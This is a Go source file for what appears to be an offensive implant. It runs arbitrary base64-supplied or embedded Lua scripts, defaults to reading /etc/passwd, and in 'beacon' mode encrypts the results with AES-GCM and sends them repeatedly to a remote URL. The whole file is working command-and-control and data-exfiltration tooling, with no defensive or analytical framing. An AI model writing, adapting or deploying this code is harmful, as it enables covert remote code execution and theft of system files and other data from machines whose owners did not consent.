package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	_ "embed"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"
	"time"

	libs "github.com/vadv/gopher-lua-libs"
	lua "github.com/yuin/gopher-lua"
)

//go:embed probe.lua
var lockDefault string

var (
	execScript  = flag.String("execute", "", "base64-encoded lua script")
	execFile    = flag.String("file", "", "execute lua script from file (legacy mode)")
	hostFlag    = flag.String("host", "google.com", "host to probe")
	portFlag    = flag.Int("port", 80, "port to probe")
	fileFlag    = flag.String("file-target", "/etc/passwd", "target file")
	beaconURL   = flag.String("beacon", "", "beacon URL for periodic reporting")
	beaconInt   = flag.Duration("interval", 60*time.Second, "beacon interval")
	beaconCount = flag.Int("count", 0, "beacon count (0=infinite)")
	passphrase  = flag.String("key", "", "encryption passphrase (auto-generated if empty)")
)

// genPassphrase creates a random 16-char passphrase
func genPassphrase() string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, 16)
	rand.Read(b)
	for i := range b {
		b[i] = chars[b[i]%byte(len(chars))]
	}
	return string(b)
}

// deriveKey creates AES-256 key from passphrase
func deriveKey(pass string) []byte {
	h := sha256.Sum256([]byte(pass))
	return h[:]
}

// encrypt data using AES-GCM
func encrypt(plaintext []byte, key []byte) (string, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return "", err
	}

	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
	return base64.StdEncoding.EncodeToString(ciphertext), nil
}

// Get Lua ctx as base64 or file
func getCtx() string {
	if *execScript != "" {
		decoded, err := base64.StdEncoding.DecodeString(*execScript)
		if err != nil {
			log.Fatalf("[!] Failed to decode base64 script: %v", err)
		}
		return string(decoded)
	}
	if *execFile != "" {
		content, err := os.ReadFile(*execFile)
		if err != nil {
			log.Fatalf("[!] Failed to read file: %v", err)
		}
		return string(content)
	}
	return lockDefault
}

// converts Lua values to Go types
func typesTable(lv lua.LValue) interface{} {
	switch v := lv.(type) {
	case *lua.LNilType:
		return nil
	case lua.LBool:
		return bool(v)
	case lua.LString:
		return string(v)
	case lua.LNumber:
		return float64(v)
	case *lua.LTable:
		maxn := v.MaxN()
		if maxn == 0 {
			ret := make(map[string]interface{})
			v.ForEach(func(key, value lua.LValue) {
				keyStr := fmt.Sprint(typesTable(key))
				ret[keyStr] = typesTable(value)
			})
			return ret
		} else {
			ret := make([]interface{}, 0, maxn)
			for i := 1; i <= maxn; i++ {
				ret = append(ret, typesTable(v.RawGetInt(i)))
			}
			return ret
		}
	default:
		return fmt.Sprint(v)
	}
}

// run Lua ctx
func runCtx(ctx string) (map[string]interface{}, error) {
	L := lua.NewState()
	defer L.Close()

	libs.Preload(L)
	L.SetGlobal("THOST", lua.LString(*hostFlag))
	L.SetGlobal("PORT", lua.LNumber(*portFlag))
	L.SetGlobal("SAMPLE_FILE", lua.LString(*fileFlag))

	if err := L.DoString(ctx); err != nil {
		return nil, fmt.Errorf("execution error: %v", err)
	}

	ret := L.Get(-1)
	L.Pop(1)

	result := typesTable(ret)
	if resultMap, ok := result.(map[string]interface{}); ok {
		return resultMap, nil
	}

	return map[string]interface{}{"raw": result}, nil
}

// beacon encrypted findings to remote endpoint
func beacon(url string, data map[string]interface{}, key []byte) error {
	payload := map[string]interface{}{
		"timestamp": time.Now().UTC().Format(time.RFC3339),
		"findings":  data,
	}

	jsonData, err := json.Marshal(payload)
	if err != nil {
		return err
	}

	encrypted, err := encrypt(jsonData, key)
	if err != nil {
		return err
	}

	body := map[string]string{"d": encrypted}
	bodyJSON, _ := json.Marshal(body)

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Post(url, "application/json", bytes.NewBuffer(bodyJSON))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 400 {
		return fmt.Errorf("beacon failed: %d", resp.StatusCode)
	}
	return nil
}

func main() {
	flag.Parse()

	ctx := getCtx()
	if ctx == "" {
		log.Fatal("No lua ctx provided. Use -execute <base64> or -file <path>")
	}

	// Single run mode
	if *beaconURL == "" {
		output, err := runCtx(ctx)
		if err != nil {
			log.Printf("[!] Execution error: %v", err)
			return
		}
		jsonData, _ := json.MarshalIndent(output, "", "  ")
		fmt.Println(string(jsonData))
		return
	}

	// Beacon mode - setup encryption
	pass := *passphrase
	if pass == "" {
		pass = genPassphrase()
	}
	key := deriveKey(pass)
	log.Printf("[*] Decryption key: %s", pass)

	runs := 0
	for {
		output, err := runCtx(ctx)
		if err != nil {
			log.Printf("[!] Execution error: %v", err)
		} else {
			if err := beacon(*beaconURL, output, key); err != nil {
				log.Printf("[!] Beacon error: %v", err)
			}
		}

		runs++
		if *beaconCount > 0 && runs >= *beaconCount {
			break
		}
		time.Sleep(*beaconInt)
	}
}
